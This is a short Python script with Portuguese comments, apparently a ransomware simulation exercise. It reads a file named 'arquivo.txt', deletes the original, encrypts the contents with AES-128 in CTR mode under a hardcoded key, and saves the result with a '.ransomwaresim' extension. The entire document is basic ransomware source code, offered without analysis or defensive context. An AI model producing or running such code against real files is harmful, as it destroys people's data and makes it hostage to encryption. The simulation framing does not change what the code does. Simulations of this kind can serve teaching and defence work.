import os
import pyaes

# Nome do arquivo original
file_name = "arquivo.txt"

# Verifica se o arquivo existe
if not os.path.exists(file_name):
    print(f"Arquivo '{file_name}' não encontrado.")
    exit()

# Abrir e ler o conteúdo do arquivo original
with open(file_name, "rb") as file:
    file_data = file.read()

# Remover o arquivo original
os.remove(file_name)

# Chave de criptografia (16 bytes para AES-128)
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar os dados
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado com nova extensão
encrypted_file = file_name + ".ransomwaresim"
with open(encrypted_file, "wb") as file:
    file.write(crypto_data)

print(f"Arquivo '{file_name}' criptografado como '{encrypted_file}'.")
